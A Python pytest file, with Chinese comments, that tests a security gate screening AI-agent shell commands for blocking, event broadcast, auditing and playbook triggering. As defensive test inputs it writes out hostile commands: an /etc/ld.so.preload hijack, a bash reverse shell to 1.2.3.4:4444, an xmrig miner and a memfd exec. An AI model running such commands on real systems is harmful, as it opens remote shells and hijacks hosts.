"""P0 步骤 2 —— ToolGateway Layer 4 走 ``SecMonitor.inspect()``。

以前 L4 旁路调用 ``scan_command()``：威胁命中了，但既不广播 ``security.monitor_result``
也不交 SecExecutor —— 挡住的是「执行」，缺的是「响应 / 记录 / 通知 / 工作流触发」。
本文件端到端接一遍 Layer 4（真 SecMonitor + 真 SecExecutor，只有审计落临时目录），
验四件事：拒绝执行、事件广播、审计落盘、内置剧本条件被命中。
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from trimum_core import threat_workflows  # noqa: E402
from trimum_core.event_bus import (  # noqa: E402
    EVENT_SEC_ALERT,
    EVENT_SEC_BLOCKED,
    EVENT_SEC_MONITOR,
    EVENT_WORKFLOW_TRIGGER,
    EventBus,
)
from trimum_core.models import (  # noqa: E402
    ExecuteRequest,
    ExecuteResponse,
    SourceType,
    SystemEvent,
    ToolType,
)
from trimum_core.sec_executor import SecAudit, SecExecutor, SecNotif  # noqa: E402
from trimum_core.sec_monitor import (  # noqa: E402
    OpContextClassifier,
    SecMonitor,
    ThreatMatcher,
)
from trimum_core.tool_gateway import ToolGateway  # noqa: E402
from trimum_core.workflow_runtime import WorkflowRuntime  # noqa: E402


#: L4 的「必拦」样例命令：**写入**劫持文件（`cat` 读它不算劫持，见签名收敛）
BLOCKED_COMMAND = "echo evil >> /etc/ld.so.preload"


def _request(command: str) -> ExecuteRequest:
    return ExecuteRequest(
        tool=ToolType.SHELL,
        args=command.split(),
        agent_id="tester",
        source_type=SourceType.AI,
        skip_cwd_check=True,
    )


class _Recorder:
    """订阅关心的安全事件（总线是异步扇出，断言前记得 sleep 一拍）。"""

    WATCHED = (EVENT_SEC_MONITOR, EVENT_SEC_ALERT, EVENT_SEC_BLOCKED, EVENT_WORKFLOW_TRIGGER)

    def __init__(self, bus: EventBus) -> None:
        self.events: dict[str, list[SystemEvent]] = {key: [] for key in self.WATCHED}
        for key in self.WATCHED:
            bus.subscribe(key, self._make(key))

    def _make(self, key: str):
        async def capture(event: SystemEvent) -> None:
            self.events[key].append(event)
        return capture

    def __getitem__(self, key: str) -> list[SystemEvent]:
        return self.events[key]


@pytest.fixture
def wired(tmp_path):
    """按 main.py ``init_security()`` 的方式装配 Layer 4（审计写临时目录）。"""
    bus = EventBus()
    recorder = _Recorder(bus)
    audit = SecAudit(audit_path=str(tmp_path / "security.log"))
    executor = SecExecutor(bus, audit, SecNotif(bus))
    monitor = SecMonitor(bus, ThreatMatcher(), OpContextClassifier(), executor)
    gateway = ToolGateway(sec_monitor=monitor, sec_executor=executor, event_bus=bus)
    return gateway, recorder, tmp_path


class TestLayer4Deny:
    """DENY 类威胁：拒绝执行 + 广播 + 审计 + 工作流触发，四件都要发生。"""

    @pytest.mark.asyncio
    async def test_command_is_blocked_by_the_monitor(self, wired):
        gateway, recorder, _tmp = wired

        resp = await gateway.execute(_request(BLOCKED_COMMAND))
        await asyncio.sleep(0.05)

        assert resp.status == "denied"
        assert resp.exit_code == 137
        assert "SECURITY BLOCKED" in (resp.error or "")
        assert resp.action.value == "deny"

    @pytest.mark.asyncio
    async def test_flat_monitor_result_is_broadcast_with_the_scan_context(self, wired):
        gateway, recorder, _tmp = wired

        await gateway.execute(_request(BLOCKED_COMMAND))
        await asyncio.sleep(0.05)

        assert len(recorder[EVENT_SEC_MONITOR]) == 1
        payload = recorder[EVENT_SEC_MONITOR][0].payload
        assert payload["threat_name"] == "ld_preload"
        assert payload["command"] == BLOCKED_COMMAND
        assert payload["agent_id"] == "tester"
        assert payload["layer_hit"] == "L4"
        assert payload["pid"] == 0, "L4 是执行前闸门，不能拿 daemon 自己的 PID 冒充"

    @pytest.mark.asyncio
    async def test_executor_audits_and_notifies(self, wired):
        gateway, recorder, tmp_path = wired

        await gateway.execute(_request(BLOCKED_COMMAND))
        await asyncio.sleep(0.05)

        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_BLOCKED]] == ["ld_preload"]
        # 归属（P0 步骤 3）：SecExecutor 不发 workflow.trigger —— 剧本的自动触发只走
        # security.monitor_result，两套并存会让同一次威胁被两条链各跑一遍。
        assert recorder[EVENT_WORKFLOW_TRIGGER] == []
        audit_text = (tmp_path / "security.log").read_text(encoding="utf-8")
        assert "ld_preload" in audit_text and "deny" in audit_text

    @pytest.mark.asyncio
    async def test_payload_satisfies_the_builtin_script_condition(self, wired):
        """契约闭环：L4 发出去的载荷真的能让内置剧本条件成立。"""
        gateway, recorder, _tmp = wired

        await gateway.execute(_request(BLOCKED_COMMAND))
        await asyncio.sleep(0.05)

        payload = recorder[EVENT_SEC_MONITOR][0].payload
        entry = next(
            item for item in threat_workflows.THREAT_WORKFLOWS
            if item["name"] == "threat-prelink-check"
        )
        assert WorkflowRuntime.eval_condition(
            threat_workflows.trigger_condition(entry), payload
        )


class TestLayer4NonDeny:
    """非 DENY 类威胁的处置：拦截类（KILL / FREEZE / ISOLATE）在执行前等价于拒绝，
    CONFIRM 类转成确认（非交互路径放行 + 广播）。"""

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "command, threat_name, workflow",
        [
            (
                "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
                "reverse_shell",
                "threat-revshell-cleanup",
            ),
            ("xmrig --donate-level 1", "crypto_miner", "threat-crypto-scan"),
            ("bash /proc/self/fd/3", "memfd_exec", "threat-memfd-scan"),
        ],
    )
    async def test_kill_freeze_isolate_are_blocked_before_execution(
        self, wired, command, threat_name, workflow
    ):
        """执行前闸门没有子进程可冻/杀（pid=0）——「不让它跑」就是等价的响应。"""
        gateway, recorder, _tmp = wired

        resp = await gateway.execute(_request(command))
        await asyncio.sleep(0.05)

        assert resp.status == "denied"
        assert resp.exit_code == 137
        assert resp.risk.value == "critical"
        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_MONITOR]] == [
            threat_name
        ]
        # 剧本名随 monitor_result 的扁平载荷走（不再另发 workflow.trigger）
        assert [event.payload["workflow_name"] for event in recorder[EVENT_SEC_MONITOR]] == [
            workflow
        ]
        assert recorder[EVENT_WORKFLOW_TRIGGER] == []

    @pytest.mark.asyncio
    async def test_confirm_threat_is_reported_but_the_command_still_runs(self, wired):
        gateway, recorder, _tmp = wired

        resp = await gateway.execute(_request("echo npm install demo"))
        await asyncio.sleep(0.05)

        assert resp.status in ("allowed", "confirmed", "success")
        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_MONITOR]] == [
            "supply_chain"
        ]
        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_ALERT]] == [
            "supply_chain"
        ]
        assert recorder[EVENT_SEC_BLOCKED] == []


class TestLayer4QuietPath:
    @pytest.mark.asyncio
    async def test_clean_command_stays_quiet(self, wired):
        gateway, recorder, tmp_path = wired

        resp = await gateway.execute(_request("echo hello"))
        await asyncio.sleep(0.05)

        assert resp.status in ("allowed", "confirmed", "success")
        for key in _Recorder.WATCHED:
            assert recorder[key] == [], key
        assert not (tmp_path / "security.log").exists()


class TestLayer4DefaultWiring:
    """L4 不再依赖「谁记得注入监控」：任何入口建出来的网关都自带（scan-only 兜底）。

    以前只有 daemon 的网关挂了 SecMonitor，`trm ask` / `trm exec` / workflow 的兜底
    网关都没有 L4 —— 命中威胁既不广播也不阻断（缺口）。现在没被注入时网关自建
    ``SecurityRuntime.local()``：同一条事件链，只是审计不落盘。
    """

    @pytest.mark.asyncio
    async def test_plain_gateway_blocks_and_broadcasts_without_a_daemon(self):
        bus = EventBus()
        recorder = _Recorder(bus)
        gateway = ToolGateway(event_bus=bus)  # 不注入 monitor：模拟 `trm ask` / `trm exec`

        assert gateway.sec_monitor is not None
        resp = await gateway.execute(_request(BLOCKED_COMMAND))
        await asyncio.sleep(0.05)

        assert resp.status == "denied"
        assert resp.exit_code == 137
        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_MONITOR]] == [
            "ld_preload"
        ]
        assert [event.payload["threat_name"] for event in recorder[EVENT_SEC_BLOCKED]] == [
            "ld_preload"
        ]

    def test_local_pipeline_never_writes_the_home_audit_log(self):
        """裸 CLI 进程不该往 ~/.trimum 写安全审计（那是 daemon 的审计链）。"""
        gateway = ToolGateway()

        assert gateway.sec_executor.audit.audit_path is None

    def test_layer4_can_be_switched_off_explicitly(self):
        gateway = ToolGateway(layer4=False, event_bus=EventBus())

        assert gateway.sec_monitor is None

    def test_workflow_runtime_fallback_gateway_also_carries_layer4(self):
        runtime = WorkflowRuntime(EventBus())

        assert runtime._ensure_gateway().sec_monitor is not None


class _RecordingGateway:
    """记录请求的假网关（端到端用例里替 ToolGateway 执行剧本步骤）。"""

    def __init__(self) -> None:
        self.requests: list = []

    async def execute(self, request):
        self.requests.append(request)
        return ExecuteResponse(
            execution_id="x", status="allowed", output="ok", exit_code=0
        )


class TestLayer4DrivesTheScript:
    """归属闭环（P0 步骤 3）：L4 发的 ``security.monitor_result`` 就是剧本的驱动事件。"""

    @pytest.mark.asyncio
    async def test_the_broadcast_really_triggers_a_registered_script(self, wired):
        gateway, _recorder, _tmp = wired
        bus = gateway.event_bus
        runner = _RecordingGateway()
        runtime = WorkflowRuntime(bus, gateway=runner)
        entry = {
            "name": "test-ld-preload-script",
            "trigger": "security.monitor_result",
            "filter": {"threat_name": "ld_preload"},
            # 步骤得是**取证命令**：事件自动触发的运行只放行取证命令步骤
            # （剧本自动触发策略，见 tests/test_playbook_auto_trigger.py）
            "steps": ["crontab -l"],
        }
        runtime.register(
            threat_workflows.to_workflow_def_v2(entry), source="test", enabled=True
        )
        await runtime.start()
        try:
            baseline = runtime.run_count
            # 命令被 L4 拦下，同时它触发的剧本真的跑起来了
            resp = await gateway.execute(_request(BLOCKED_COMMAND))
            records = await runtime.wait_for_runs(since=baseline, timeout=5)
        finally:
            await runtime.stop()

        assert resp.status == "denied"
        assert len(records) == 1
        assert records[0].status == "completed"
        assert records[0].triggered_by == "event"
        # L4 用 ``publish(SystemEvent(...))`` 直发，没有 ``emit_event`` 的 ``event.`` 命名空间
        # 前缀；匹配端两种写法都认（见 workflow_runtime.type_matches）
        assert records[0].trigger_event == "security.monitor_result"
        assert [request.args for request in runner.requests] == [["crontab -l"]]
